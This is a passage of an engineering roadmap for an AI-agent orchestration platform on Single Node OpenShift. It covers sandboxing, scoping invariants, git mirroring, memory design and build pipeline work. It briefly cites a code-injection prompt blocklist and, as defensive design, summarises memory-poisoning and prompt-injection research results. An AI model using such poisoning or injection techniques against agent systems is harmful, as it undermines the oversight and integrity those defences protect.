# Gordon Control Plane — Roadmap

**Status:** Authoritative. Supersedes every plan file in `hack/plans/archive/`.
**Written:** 2026-09-20
**Purpose:** Each numbered entry is a self-contained, independently useful feature, sized to be fed
directly to `/code-quality:incremental-planning`. Tiers are ordered so that each builds on the last;
entries within a tier are ordered but often parallelisable.

---

## Part 1 — Where we actually are

Verified, not assumed:

| Claim | Evidence |
|---|---|
| ~1,300 lines of Python total | `gateway/unified_api.py` 318, `temporal_worker.py` 127, `shunt_middleware.py` 124, `local_worker.py` 114, rest tests |
| **No container image has ever been published** | All 7 jobs in `build-push.yml` fail, on `main` and on PR (runs 35451573978, 35507787094) |
| Root `Dockerfile` is a stub | `FROM alpine:3.19` + `sleep 3600` loop, comment says "to be replaced" |
| 5 of 7 CI images point at non-existent paths | Matrix builds `{name}/Dockerfile`; no `mcp-server/`, `sandbox/`, `relay/`, `interactive-agent/`, `agent-platform-worker/` directories exist |
| The Helm chart has never been deployed | It references 5 images that do not exist |
| The orchestrator makes **zero LLM calls** | `ci_pipeline.py` and `pm_standup.py` are stub graphs returning hardcoded dicts |
| `/api/workflows*` are stubs | `unified_api.py:170-187` return literal `{"id": "wf_12345"}` |
| Test suite | 25 pass, 1 fail (`test_update_config_valid_yaml` → 500) |
| `hack/` is gitignored | `.gitignore:1` — so no agent workspace can ever see project memory |

**Four competing architectures were in flight simultaneously.** The agent-runtime plan extends
`shunt_middleware.py` into a grounding-validator guardrail; the router-temporal plan deletes that file
outright; the ACP plan and the Vercel-AI-SDK plan are two different interactive transports; and
`hack/research/architecture-shunt-vs-langgraph.md` proposes a third direction again (CQRS memory with
Redis materialized views and Neo4j/Milvus). OmniAgent's role flipped from "absolute entrypoint"
(2026-09-18) to "demoted semantic router" (2026-09-19). None of the five plans mention projects,
supervisors, orchestrators, or workflow blocks — which is most of the actual product.

`LESSONS.md:1` records "do not sanitize prompts with hardcoded blocklists." `shunt_middleware.py:77`
blocks on `<script>`, `exec(`, `system(`, `../`. The lesson was written and then not applied.

---

## Part 1b — Verified target environment

Queried live against the running cluster on 2026-09-20. These are measurements, not assumptions, and
several of them close questions this document previously listed as unverifiable.

| Property | Value | Consequence |
|---|---|---|
| OpenShift | 4.22.11 (k8s 1.35.6), CRI-O 1.35.6, RHCOS 9.8, kernel 5.14 | Current. CRI-O confirms the gVisor exclusion. *(Validated: Red Hat has no explicit 'gVisor unsupported' statement; it is an implicit omission as their docs only list runc, crun, and Kata).*  |
| Topology | Single node `edge-24`, roles control-plane+master+worker, platform `None`, `SingleReplica` control plane and infra | True SNO. No sibling node for any rolling operation. |
| Capacity | 8 CPU / 64GB (7500m / ~61GB allocatable), 700GB ephemeral, 250 pod ceiling | Real budget for the capacity model in 1.8. |
| Current load | 9% CPU, **49% memory at idle** | **~30GB actually free.** Nexus CE's 8GB floor would consume a quarter of remaining headroom — decides 2.5's tooling choice against it. |
| CNI | OVNKubernetes; `egressfirewalls.k8s.ovn.org` present, `spec.egress.to.dnsName` supports domains and single-label wildcards. **No `DNSNameResolver` CRD; feature gates are default** | No Cilium or FQDN reconciler needed — but see the caveat below. `dnsName` runs the legacy resolve-and-cache path here, **not** the improved resolver. |
| Storage | LVMS / `topolvm.io`, one default class `lvms-vg1`, `WaitForFirstConsumer`, expansion enabled | **RWO only — RWX is not merely inadvisable here, it is unavailable.** Retroactively validates the workspace design. Node-local by construction, which is free on SNO. |
| Operator catalog | `sandboxed-containers-operator`, `lvms-operator` all present in Red Hat Operators | **Creates a deployment risk for 2.1.** Google's `Agent Substrate` control plane is not in the Red Hat catalog and must be deployed manually via `ko` or Helm. However, Red Hat's `sandboxed-containers-operator` provides the Kata microVMs Substrate requires. |

**Still to verify on this cluster** (needs a node-level check, not an API query): whether the node
exposes hardware virtualization for Kata, i.e. real bare metal versus a VM without nested virt.
`platform: None` indicates no cloud integration but does not by itself prove bare metal. This is the
last gate on 2.7.

## Part 2A — Invariants

**Read this before planning any entry.** These are constraints, not history: an entry that violates one
is wrong, regardless of how sensible it reads in isolation. Each lists the entries that enforce it, so
a violation is checkable rather than a matter of taste. Full rationale for each lives in Part 2B.

| # | Invariant | Enforced by |
|---|---|---|
| **I1** | **Enforce at the boundary, never in a prompt.** Any rule an agent could ignore must be structurally impossible, not requested. This is the most-repeated principle in this document and the one most often rediscovered the hard way. | 2.2 (read interception, command decomposition), 4.5 (declare-then-schedule claiming), 6.2 (permission engine), 3.1 (scope at invocation), 6.5 (untrusted wrapping at the tool boundary) |
| **I2** | **No inbound network path. Ever.** Everything reaches out: polling, `git ls-remote`, Slack Socket Mode, outbound Temporal workers. | 5.6, 2.3, 7.7, 4.9c, 0.5 |
| **I3** | **The secret boundary is the deterministic-block boundary.** No LLM block ever receives a credential; deterministic blocks and tool adapters attach them at point of use. | 3.2, 2.6, 4.7, 4.9b |
| **I4** | **Four categories, not three.** **Blocks** are orchestration units (test: can the orchestrator route around the failure?). **Tools** are in-turn actions executed *in the sandbox*. **Platform-mediated tools** are in-turn actions executed *by the platform* on the block's behalf. **Integrations** are sources of tools — explicitly divided into **Platform-level MCP servers** (run alongside Temporal, handle credentials/network) and **Sandbox-level MCP servers** (run inside Substrate, zero credentials, manage LSP/AST over the cloned filesystem). | 4.3, 4.4, 4.6, 3.1, 3.3, 3.4, 2.2 |
| **I5** | **Scoping is definition + many-to-many binding, applied uniformly to every catalogue entity**, and enforced at invocation — visibility never implies permission. | 3.1, 3.2, 3.3, 4.3b, 4.9, 5.1, 6.2 |
| **I6** | **Agents propose; humans approve.** New capabilities (4.13) and durable memory promotions (5.2) require review. Raw events and ad-hoc composition do not. | 4.13, 5.2, 6.1, 6.3 |
| **I7** | **Memory lives in the platform, never in a user's repo.** | 5.1, 5.2, 2.4 |
| **I8** | **Agent blocks never touch the network for git.** Clone from the in-cluster mirror, commit locally; one deterministic block publishes. | 2.3, 2.4, 4.7 |
| **I9** | **A project owns 1..N repos; a task declares the subset it touches**, and the workspace checks out only that subset. | 2.1, 2.3, 2.4, 4.7 |
| **I10** | **Atomic cross-repo change does not exist.** Coordinated dependency-ordered PRs — a saga with visible intermediate state. | 4.7, 7.3 |
| **I11** | **The cross-repo dependency graph is parsed, never hand-authored.** A stale graph is worse than none because it is trusted. | 1.1c, 4.7 |
| **I12** | **Workflows nest**, with an engine-enforced depth bound and definition-time cycle detection. | 4.6, 6.4 |
| **I13** | **Configuration is DB-canonical.** The GitOps repo holds only what Helm consumes. | 1.1, 1.2, 1.3, 1.4, 8.1, 0.2 |
| **I14** | **Isolation is tiered, and the runtime tier ranks last** among controls — behind egress, credentials, and permission policy. | 2.1, 2.5, 2.7, 6.2 |
| **I15** | **Fail to escalation, not to allow and not to paralysis.** Classifiers, validators, and gates route to the queue when uncertain or broken. | 1.9, 6.1, 6.2, 6.3, 4.6b |
| **I16** | **Reaching the network is not authorisation.** Tailnet membership, cluster access, and holding a certificate each answer *who connected* — never *what they may do*. Every control plane with side effects authenticates and authorises independently. | 1.10 (Temporal), 2.2 (exec plane), 1.2 (API), 3.4 (broker) |
| **I17** | **The platform operates under the Principle of Least Privilege and never requires CI/CD bypass rights.** Agents are subject to the same Branch Protections as humans. Mutually exclusive actions are structurally blocked pre-flight; they are never forced. | 4.7 |

**Every invariant now names an enforcing entry.** I11 briefly did not — it declared a parsed dependency
graph that no entry produced — which is the same declared-but-unbuilt pattern that previously produced
the Tailscale ingress gap and the missing repo-bindings schema. It is closed by 1.1c. **If a future
invariant is added here without an enforcing entry, that is a defect, not a placeholder.**

---

## Part 2B — Decision log *(archival; rationale, not constraints)*

**This section is not authoritative for planning** — Part 2A is. What follows records *why* choices
were made, including options rejected and evidence weighed, so a future session can re-open a decision
knowingly rather than re-litigate it blindly. Where 2A and 2B appear to disagree, 2A wins and the
discrepancy is a bug.

These are inputs to planning, not open questions. Do not re-litigate them in a planning session.

### Product shape
- **Audience:** design for solo operator with many projects. Multi-user/team self-hosting is an
  explicit stretch goal — shape the schema and auth for it, do not build it.
- **Definitions are DB-canonical.** Postgres is the source of truth for projects, agents, blocks,
  workflows, personas, integrations. Every entity exports to versioned YAML for backup/diff/share.
  Optional one-way sync *from* a git repo later. Authoring happens in the UI.
- **One runtime, with a fast-path escape hatch.** Every agent run — including interactive chat — is a
  Temporal-durable execution. The global supervisor may answer trivially (no tools, no state change)
  without opening a workflow. OmniAgent is deleted; it has no seat in the supervisor hierarchy.
- **Agent hierarchy:** global supervisor → per-project supervisor → per-task orchestrator → blocks.
- **Block vs tool vs integration — the distinction the whole model rests on.** A **block** is a unit of
  *orchestration*: scheduled by the orchestrator, durable, typed, produces artifacts, and its failure is
  a **routable outcome**. A **tool** is a unit of *action within a block's turn*: called by the LLM
  while executing, ephemeral, returns a value, and its failure is something the model handles in-turn.
  An **integration** is the *source* of tools (an MCP server provides N tools); nothing schedules one.
  - **The test: can the orchestrator route around its failure?** If yes, it is a block.
  - This is why `run_tests` is a block despite "just running a command" — the orchestrator must see the
    failure and feed it back to the writer block, which is the 4.6 feedback loop and the point of the
    product. And why `read_file` is not — scheduling a single file read as a durable artifact-producing
    step is the wrong granularity.
  - **The same capability may legitimately exist at both levels.** An MCP server is an integration whose
    tools blocks can call; wrapping it in a block is how you make it something the orchestrator can
    schedule and route around. Choose by who needs to make a decision on the outcome.
  - Consequence for 3.3: the orchestrator's catalogue is *dozens of blocks*, not *hundreds of tools*.
- **Scoping is one mechanism, defined once, applied to every catalogue entity.** Integrations, tools,
  blocks, workflows, agents/personas, and memory all carry the same scope model — not six ad-hoc rules
  that fail to compose the moment one integration needs all of them at once.
  - **Two levels: `global` and project-bound**, where project binding is **many-to-many**. An
    integration like `chai_bot` is bound to the specific projects it applies to (`osac`, and any
    others) rather than being global-with-a-filter or duplicated per project.
  - **Separate the *definition* from the *binding*.** A definition says what a thing is (this MCP
    server, these tools, this block's contract). A binding says *this project uses it, with this
    credential and this configuration*. That split is what lets `chai_bot` exist once and attach to two
    projects, while GitHub exists once and binds everywhere **with different per-project config** —
    both cases fall out of the same model instead of needing special handling.
  - **Resolution:** an agent or block operating in project P sees global entities plus those bound to
    P. A project-bound entity may override a global one of the same name; the override is surfaced
    explicitly in the UI, never silently divergent.
  - **Enforcement is at the invocation boundary, not at prompt-build time.** Scoping that only hides a
    capability from the model is not scoping — GitHub's MCP server shipped discovery that bypassed its
    own read-only flag precisely because visibility and permission were separate systems. A capability
    outside the caller's scope is refused when called, by 6.2, regardless of how it became visible.
  - **`global` and "defined once" are different things.** Every definition exists once in the
    catalogue; that is not a scope. `global` means *auto-bound to every project*. A non-global
    definition with no bindings is available to nobody — which is the correct default for something
    like a project-specific integration.
  - **Availability and configuration are separate axes.** A binding row exists either way; `global`
    only decides whether it is created automatically. So GitHub can be global *and* carry a different
    credential and repo scope per project, while a project-specific integration is non-global with
    explicit bindings, and a config-less utility block is global with empty bindings.
  - **Bindings must be dependency-consistent.** A block that depends on an integration cannot be usable
    in a project bound to the block but not the integration. Binding validates its dependency closure
    and refuses — or offers to bind the dependency too — rather than producing a capability that
    resolves at plan time and fails at invocation.
  - This closes what were three separate open questions about whether agents, personas, and blocks are
    global or per-project. They are all the same answer.
- **A project owns 1..N repos.** *(Reverses an earlier 1:1 decision — the evidence was decisive.)* A
  project holds shared memory, integrations, supervisor policy, and blocks, and declares an ordered set
  of **repo bindings** (clone URL, default branch, role label, dependency edges to sibling bindings).
  Every agent platform that outgrew single-user demos in 2026 independently built this: Cursor shipped
  multi-repo cloud agent environments in May 2026 and explicitly called its prior single-repo scoping a
  limitation it removed; Gitpod's `additionalRepositories` is the same shape. Codex, Copilot's agent,
  and Jules remain single-repo, and their users are filing feature requests. Forcing 1:1 is what
  produced the operator's spine workaround in the first place — a model that doesn't describe reality
  gets an unofficial one built beside it. A constituent repo that is itself a monorepo is just one
  binding with a coarser internal layout; nothing special is required.
- **Tasks declare a repo subset; the workspace checks out only that subset.** Blast radius should equal
  the *task's* scope, not the project's full footprint. This is the one place the single-repo platforms
  are right — their stated reasoning is containment, and Anthropic measured an 84% reduction in
  permission prompts from tight sandbox scoping, so the value is observed rather than assumed. Reject
  "one workspace per repo" as the default: it reintroduces exactly the cross-repo blindness that
  motivates multi-repo support. Keep it only as the degenerate single-repo case.
- **The cross-repo dependency graph is parsed, never hand-authored.** Derive it from imports,
  manifests, and CODEOWNERS on a refresh cadence (the GitLab Orbit / Meta approach). The documented
  failure mode of hand-maintained graphs is drift — mabl built one and left "who maintains the graph"
  unresolved in their own writeup, and the named hazard is an agent "confidently shipping changes
  against a stale model." A stale graph is worse than no graph, because it is trusted.
- **Atomic cross-repo change does not exist, and the roadmap will not pretend otherwise.** Nobody has
  solved it at the VCS layer. Sourcegraph's Batch Changes ships 2,200+ changesets in a campaign and
  documents them as independently mergeable; Nx Polygraph carries the same explicit disclaimer. The
  state of the art is **dependency-ordered coordinated PRs — a saga, not a transaction**: libraries
  before consumers, the intermediate state made visible, merge order explicit. If a change genuinely
  requires single-transaction landing, the honest answer is to restructure that slice into one repo.
- **Orchestration is two-path.** The orchestrator selects and parameterises a **predefined workflow**
  from the library (4.6) as the default; when nothing matches, it **plans dynamically** from existing
  blocks (4.12). Predefined is reviewable, bounded, and evaluable, so it is built first and stays the
  common path; dynamic handles novelty.
- **Agents propose capabilities; humans approve them.** An orchestrator may draft a new block or
  workflow, but it lands in the pending queue as a reviewable diff and cannot execute before approval
  (4.13). This is the same shape as memory promotion (5.2), for the same reason: an LLM authoring
  instructions that another LLM will execute with tool access is the highest-leverage thing to gate.
- **Work starts from four sources:** operator chat, schedule, GitHub events, and supervisor initiative
  (5.6).
- **No inbound network path. Ever — this is an invariant, not a preference.** Nothing outside the
  tailnet may initiate a connection to the cluster. Everything reaches out: GitHub triggers poll with
  ETag conditional requests (304s are free, verified), the git mirror polls with `git ls-remote` (git
  protocol, no REST quota), and Slack uses **Socket Mode** (outbound WebSocket, no public Request URL).
  Rejected alternatives and why: Cloudflare Tunnel terminates TLS at Cloudflare's edge and is
  bidirectional once established, relocating inbound to a third party that can also read all traffic;
  Cloudflare Workers **cannot** join a tailnet at all (Workers `connect()` is outbound TCP only,
  WireGuard requires UDP); Tailscale Funnel is public exposure by definition. Latency costs nothing
  here because triggered work runs for minutes.

### Execution
- **Isolation is tiered, and the runtime tier ranks *last* among available controls.** Ranked by
  safety-per-effort: egress allowlisting > credential scoping > permission policy > isolation runtime.
  - **Tier 0 (default):** hardened runc/CRI-O. Read-only root, all caps dropped, non-root, default-deny
    egress. **Identical on OCP SNO and kind** — no CI/production parity gap at this tier.
  - **Tier 1 (untrusted external code only):** Kata via OpenShift sandboxed containers.
  - **gVisor is out.** OCP uses CRI-O and Red Hat supports only runc and Kata. gVisor also breaks in
    kind (gvisor#11313: no overlayfs support → Docker falls back to VFS → kind's nested containers break).
  - **kind cannot run either strong runtime.** Treat `RuntimeClass` there as a configurable no-op that
    validates policy wiring only.
- **Kata on Single Node OpenShift works but needs a maintenance window.** Creating the `KataConfig` CR
  triggers an automatic node reboot of 10–60+ minutes. On SNO there is no sibling node — that is total
  cluster downtime. Requires real bare metal (nested virt unsupported); on-prem peer-pods is
  experimental. **Verified (Spike S5):** Standalone SNO installs of OSC do *not* require RHACM; the
  conflicting documentation from earlier release notes is a non-issue.
- **Agent blocks never touch the network for git; a deterministic block publishes.** LLM blocks clone
  from an in-cluster mirror, edit, and commit entirely locally. A separate non-LLM block owns push, PR
  creation, and PR updates, and it is the only client of the credential broker. Consequences: no LLM
  block ever holds a git credential; the one component with outbound write access has fully specified,
  auditable behaviour instead of model-generated behaviour; and a prompt-injected block cannot reach
  GitHub at all. A second deterministic block owns CI check status and reruns, so CI results enter the
  orchestrator as structured data rather than as something a model scrapes.
- **Mirror everything the sandbox pulls — git included.** A raw clone from github.com per task is a
  hot-path network dependency, and mirroring npm and PyPI while leaving git unmirrored is incoherent.
  With a per-project git mirror plus package mirrors, the target is a routine block needing **zero
  public internet egress**.
- **Workspace = one pod per task run, alive for the task's duration.** Shared-tree blocks exec in a
  a node-local PVC (see 4.5 — PVC is the default; `emptyDir` is only for scratch that must not
  survive). **Avoid RWX entirely** — Longhorn RWX is NFS underneath with documented 50%+
  throughput loss, ~10MB/s under load, D-state hangs on concurrent writers, and corruption under
  sustained writes. On the measured cluster RWX is not merely inadvisable but **unavailable** — topolvm
  is RWO-only (Part 1b) — and workspaces use a node-local RWO PVC by default (4.5).
- **Isolated tree = a separate local hardlinked clone, not a worktree.** Worktrees share `.git/` —
  objects, refs, config, *and hooks*. Documented races: `.git/config.lock` on concurrent
  `worktree add`, `.git/index.lock` losing commits, stale locks from crashed agents, concurrent
  `git gc` pruning objects another worktree needs. `git clone /workspace/repo` (not `--shared`) gets
  its own `.git`, index, and lock namespace, hardlinks objects, and costs almost nothing.
- **Stay on git. Do not adopt jj.** jj's operation log genuinely eliminates git's index/config lock
  races, and `jj op restore` is a better agent-undo story than reflog. It is disqualified by one
  architectural fact: **git hooks, including pre-commit, do not run under jj at all, even colocated**
  (confirmed by a jj maintainer, jj-vcs#403) — jj's commit path bypasses hook execution by design.
  Our orchestrator's core feedback loop *is* "see the failing pre-commit hook, feed it back to the
  writer block." jj cannot deliver that. Secondary risks: no 1.0 (~0.45.x), no LFS, no submodules,
  no official apt package or Docker image, LLMs perform slower and fail more often on jj than git (per GitButler benchmarks) (a sandbox base image would pull a release tarball),
  concurrent `jj workspace add` can break the original workspace (jj-vcs#9314), `jj undo`/`op restore`
  rewind the *whole repository view* and silently revert concurrent writers in other workspaces, and
  `2389-research/agentjj` built an agent VCS layer on `jj-lib` then migrated `diff`/`orient`/`log`
  back to git as bugs accumulated before archiving.
  - *Divergence noted:* the research's own first choice was "jj internally as the orchestrator's
    isolation layer, agents still see git." Rejected because it introduces a second state model
    (jj view vs git index/HEAD) inside every sandbox, and a second independent research track
    converged on plain local clones for the same job with no new dependency.
- **Blocks sharing a working tree need explicit file-level claiming, not prompt discipline.** Two 2026
  papers tested concurrent coding agents directly: CodeCRDT (arXiv:2510.18893) got perfect syntactic
  convergence but mixed net effect (up to 21.1% faster on some tasks, 39.4% *slower* on others);
  AgentRoom (arXiv:2608.23740) found the CRDT substrate was not what improved outcomes — a
  runtime-enforced file claim/lock was, cutting task-abandonment odds by 13.7x. Build the claim
  mechanism; do not build CRDTs.

### Sandbox platform
- **Adopt `github.com/agent-substrate/substrate` directly via its gRPC API.** Gives a native `Control` gRPC interface for `Actor` lifecycle, providing out-of-the-box warm pools, dense multiplexing, and sub-500ms suspend/resume. Substrate manages its own worker pools (`WorkerPool`) and sandbox configs (`SandboxConfig`).
  - **We completely skip building a custom workspace controller.**
  - **We rely on Temporal to drive the Substrate `ateapipb` interface directly.**
  - **Risk:** Agent Substrate has no OLM install path or Red Hat support. We must maintain the Substrate control plane (`ateapi`/`atelet`) deployment manifests ourselves.
  - **It adds no isolation of its own** — 100% delegated to `RuntimeClass` (Kata microVMs in our case).
  - **Not yet shipped:** Agent Substrate is in early development. APIs are explicitly marked as "almost guaranteed to change."
  - **Risks accepted:** The project is an early-stage Google open source release, not an official product. Adoption implies maintaining our own forks/patches if upstream stalls.
- **No secondary agent harness in the sandbox.** We rely exclusively on Agent Substrate's `atelet` gRPC daemon for execution. We do not deploy frameworks like OpenHands, SWE-ReX, or Pi into the container.
- **Code intelligence is injected, not bundled.** Semantic tools (LSP, `ast-grep`, ripgrep) are deployed as standalone binaries in the sandbox base image and exposed to the LLM via a lightweight Model Context Protocol (MCP) server running *inside* Substrate.
- **NVIDIA/OpenShell is real and is not what our chart deploys.** Verified: Rust, Apache-2.0, 8,710
  stars, created 2026-02-24, pushed 2026-09-20. It is a single-machine kernel-level policy sandbox
  (seccomp/Landlock/SELinux + egress-injecting credentials) — a *complementary defense-in-depth layer
  to run inside a pod*, not a competitor to Agent Substrate. Our `charts/.../openshell.yaml` points at a
  private `ghcr.io/wgordon17/sandbox` image with no source and only borrows the name. Pre-0.1.0 alpha
  (v0.0.116); its own Kubernetes support is marked experimental. Evaluate as an inner layer later (2.7),
  not as the sandbox platform.

### Memory
- **Memory lives in the platform, never in the user's repos.** *(Reverses an earlier
  commit-the-files decision — that design exfiltrated platform-internal agent work into every repo the
  platform touched, including public ones, and in-repo agent instruction files are a demonstrated
  exfiltration surface, not a theoretical one.)* Three Postgres tiers following the CoALA taxonomy —
  episodic (what happened), semantic (decisions, gotchas), procedural (lessons) — scoped
  global/project/task/agent_role, with provenance and supersession columns. Delivered to sandboxes as
  **read-only files staged at provisioning time, outside the git working tree**: same "files and grep,
  auditable, no live network" property Anthropic chose for its own memory product, without the leak.
  No memory framework and no vector search at launch; `pgvector` bolts onto the same Postgres later if
  evidence demands it.
- **Raw events write freely; promotions are gated.** Gating every write manufactures rubber-stamp
  approval; gating nothing lets one hallucination outlive the session that produced it. The line is
  between recording *what happened* and elevating it to *what is true*. Promotion is signal-filtered
  (a failed attempt promotes automatically — the outcome is the signal) with human review reserved for
  contradictory or high-blast-radius items. Summaries are a **pure projection over the event log**, so
  they cannot silently diverge from history.
- **Size discipline is not optional, but the evidence cuts both ways.** Gloaguen et al.
  (arXiv:2602.11988, ETH Zurich/LogicStar) found context files do *not* generally improve success
  rates, raise inference cost >20%, hurt universally when LLM-generated, and gave only ~4% lift when
  developer-written — failing in 5 of 8 settings. The mechanism of harm is not "the agent ignores the
  file" but "the agent obeys it too literally," expanding search and reasoning steps. A widely-repeated
  "35–55% bug reduction" claim does not appear in the primary source. **Counter-evidence:** Vercel's
  Jan 2026 internal eval on Next.js 16 tasks reported an always-on docs-index AGENTS.md taking four
  frontier models from 53% to 100% pass rate. So effect size is strongly task- and repo-dependent,
  not a universal null. Both results agree on the actionable part: short, command-first, human-curated
  beats long or LLM-generated. Combined with context rot (Chroma, 2025 — degradation is continuous,
  and *coherent* filler hurts attention more than shuffled filler) and lost-in-the-middle (Liu et al.,
  TACL — >30% accuracy drop mid-context), a growing always-loaded `PROJECT.md` is a performance bug.
  The closest existing analog to today's `hack/` is Cline/Roo Code's "Memory Bank," whose documented
  failure modes are exactly ours: manual, drifts from reality, no search, doesn't travel.
- **Agents propose durable memory; they never promote it.** Blocks append raw events freely to the
  episodic tier; promoting an observation into semantic or procedural memory emits a **reviewable diff
  into the pending queue (6.1)** — not a PR, and not against a committed tier, neither of which exists
  under the Postgres design in 5.1. This mirrors the consolidation shape reported for Anthropic's
  "Dreaming" (orient → consolidate → reviewable diff, never silent). *Secondary-sourced: no Anthropic
  docs page using that term was found, and it was announced as a research preview rather than GA —
  adopt the shape on its own merits, not on the authority of the citation.*
  Review-before-promotion is the mitigation the literature supports: content screening of poisoned
  memories caught **0 of 360** entries in one study, because a false statement is syntactically
  indistinguishable from a true one; poisoning 1.2% of a corpus dropped accuracy 0.85 → 0.30. MINJA
  reports **98.2% injection success** with no privileged access (the "≥95%" figure used elsewhere in
  this document was imprecise; 98.2% is the paper's number).
- **Supersede, don't delete.** No blind TTLs on architecture/decision facts. Contradicted facts get an
  explicit successor pointer via `supersedes_id`/`superseded_at` columns (5.1) — **not** git history,
  which the rejected committed-memory design would have provided and the Postgres design does not.
- **Do not adopt a memory service preemptively.** Cognee/Zep/mem0 only earn their place if retrieval
  needs outgrow curated files. Mem0 and Zep publish mutually contradictory benchmarks.

### Delivery
- **Migrations run at app startup behind a Postgres advisory lock**, single-replica during migration,
  **liveness probes disabled during migration** (this is Coder's exact documented bug — probes killed
  pods mid-migration, so they disabled them by default in v2.30). Mandatory `pg_dump` immediately before.
- **`helm rollback` does not undo a migration.** Say so in release notes rather than implying a safety
  net that does not exist. Restore-from-backup is the only honest rollback. Full expand/contract
  discipline is not worth it at solo scale — reserve it for genuinely destructive column changes.
- **In-cluster self-upgrade is a later stretch**, and only via a controller driving the Helm Go SDK
  (the Flux helm-controller pattern) — never a pod shelling out to `helm upgrade` on its own release.

---

## Tier 0 — Make the repository real

Nothing below this tier can be validated until this tier is done, because nothing has ever been built
or deployed.

#### 0.1 — Architecture reset and phantom-component removal
**Goal:** The repo describes exactly one coherent architecture, and every file in it corresponds to
something that exists or is genuinely planned.
**Depends on:** nothing.
**Done when:** `architecture.md` and the ADRs reflect Part 2 of this document; ADR-001 (two-plane) and
ADR-002 (shunt) are superseded with new ADRs recording the collapse-to-one-runtime and
delete-the-shunt decisions; the chart templates for `omnigent`, `openshell`, `relay`, and the current
`mcp-server` are deleted; `shunt_middleware.py` and its naive blocklist are deleted; `.omnigent/` is
deleted; the CI matrix lists only components that exist.
**Decided:** delete rather than fix the shunt — token truncation belongs in the block/context layer,
and the prompt blocklist actively contradicts `LESSONS.md:1`.
**Open:** whether `scripts/local_worker.py` survives as the seed of the tool layer or is rewritten in 3.1.

#### 0.2 — Buildable images and a green build pipeline
**Goal:** Every component that exists has a real multi-stage Dockerfile and publishes a scanned,
tagged image.
**Depends on:** 0.1.
**Done when:** `build-push.yml` is green on `main`; images are pullable from ghcr; the stub root
`Dockerfile` is gone; image tags are derived from git describe/sha; SBOM and vulnerability scanning gate
the push.
**Decided: the platform's own dependencies get a CVE-response cadence, not just a build-time scan.**
Scanning at build catches what is known when you build; it does nothing about a CVE published
afterwards against something already shipped. This document insists on pinning in several places —
Agent Substrate ("pin versions", with a `v1alpha1` removal that had no upgrade path), LiteLLM, pnpm 12.x,
package-manager CVE floors — and a pin with no re-evaluation cadence is how you end up two years
behind. Scheduled rebuilds, automated dependency PRs against *our* pins (distinct from 8.4, which
bumps the *user's* chart pin), and a documented path for an out-of-band rebuild when something
critical lands. Roughly 150 lines here govern the sandbox's supply chain; this covers ours.
**Decided: images go to ghcr.io and may be private.** GHCR storage and bandwidth are currently free for
**both public and private** images — an explicit, repeatedly-renewed policy exception to GitHub
Packages billing, with a 30-day-notice commitment. Treat as free today, watch the changelog; the
underlying unenforced Free-plan quota is 500MB storage / 1GB transfer per month. Private images need a
`dockerconfigjson` pull secret from a PAT with `read:packages`, attached to the **ServiceAccount**
rather than repeated per-manifest, and present in every namespace that pulls (or synced).
**CI economics are not a constraint here.** Standard GitHub-hosted runner minutes are free and
unmetered for **public** repositories, unchanged through the January 2026 pricing restructure. Two
caveats: larger runners are always billed even on public repos, and fork-PR workflows from outside
contributors require maintainer approval. Private repos on Free get 2,000 minutes/month — so if
sensitive work moves to a private repo (see below), CI budget suddenly does matter.
**Decided: the GitOps repo holds deployment concerns only; everything the platform manages is
DB-canonical.** *(Resolves a contradiction across five entries — 8.1 and 0.2 had put the admin
allowlist, model routing, and budget figures in the config repo while 1.2, 1.3, and 1.4 made all three
DB-canonical.)* The config repo holds what **Helm** consumes: cluster values, image tags, resource
sizing, secret *references*. Models, budgets, the allowlist, projects, agents, blocks, and workflows
live in Postgres with YAML export (1.1). One authoring surface, not two.
**Decided: split public code from private configuration, and let CI economics drive the line.**
Public-repo Actions minutes are free and unmetered; private repos drop to 2,000/month on Free. So keep
the thing that *needs* CI public and the thing that *carries* sensitive values private, where it needs
little or no CI. Concretely, warranting a **private** repo:
- **The GitOps config repo** (8.1) — cluster values, admin allowlist, model routing with provider
  endpoints and budget figures. The corporate-model quota in 1.4 implies an employer relationship;
  endpoint URLs and spend caps do not belong in a public repo. Already private-by-default in 8.1.
- **Any version-controlled secret material**, SOPS/age-encrypted. Encrypted still means private.
- **Explicit memory exports** — 5.1 permits the operator to export a curated subset of memory to a
  repo. That subset is project internals by construction, so the export target defaults to private.
This keeps the platform repo public with unmetered CI, and puts nothing in the metered bucket that
runs meaningful CI, avoiding the risk of migrating repository visibility twice. Whether any repo needs to be private at all: a public repo's CI *can* reach private
repos and registries, via a GitHub App installation token (the same pattern as 2.6's broker), a scoped
deploy key, or a PAT secret — secrets stay redacted and are withheld from fork-PR workflows. The real
trust boundary is who can edit workflow files in the public repo, not the repo's visibility.

#### 0.3 — One-command local/CI cluster bring-up on kind
**Goal:** `make up` produces a running platform on kind with Postgres, MinIO, Temporal, LiteLLM,
VictoriaMetrics, `git-pkgs/proxy`, Promptfoo, and the API, and a smoke test proves it serves traffic.
**Depends on:** 0.2.
**Done when:** a fresh checkout reaches a passing smoke test with one command; the same path runs in CI;
teardown is clean.
**Decided:** kind is the CI/UAT target. NetworkPolicy is not enforced by kind's default CNI, so the
bring-up must install a policy-capable CNI for any test that asserts network isolation.
**Decided (Research: `hack/research/1789948800-temporal-ci-topology.md`): Use the Temporal CLI dev-server for standard CI, with full Helm deploy for auth and nightly validation.** The dev-server container is vastly faster and lighter for ephemeral per-PR workflow tests, but does not support 1.10's mTLS client auth or custom Authorizer plugins. Therefore, 1.10 auth and security integration tests execute against the full Temporal container in a dedicated CI job, and a scheduled nightly/weekly CI job deploys the full Temporal Helm subchart for complete end-to-end verification.

#### 0.5 — Tailscale ingress and identity injection
**Goal:** The platform is reachable on the tailnet, with cryptographic user identity injected into
every request.
**Depends on:** 0.3.
**Done when:** an unprivileged Tailscale container in userspace mode terminates the tailnet and proxies
to `127.0.0.1`, paired with a lightweight L7 proxy translating to internal ClusterIPs; no `NET_ADMIN`,
no cluster-wide RBAC, no Tailscale Kubernetes Operator; `Tailscale-User-Login` reaches the API; a
NetworkPolicy prevents any in-cluster pod from spoofing that header by reaching the API directly.
**Decided:** scheduling this explicitly because **it was assumed into existence and never built.** 0.4,
1.2, and 5.6 all depend on "the Tailscale ingress" while no entry created it — the platform's entire
authentication model rested on an unscheduled component. Recovered from the archived
`feat-tailscale-proxy.md` and the unified-gateway epic, which had reviewed designs for it.
**Decided: a Caddy sidecar handles L7.** The Tailscale container terminates the tailnet in userspace
and proxies to `127.0.0.1`; Caddy translates to internal ClusterIPs and owns path routing. Chosen over
`tailscale serve` alone because it gives a real enforcement point in front of the application — 1.2's
per-identity rate limiting, header handling, and future routing all have somewhere to live that is not
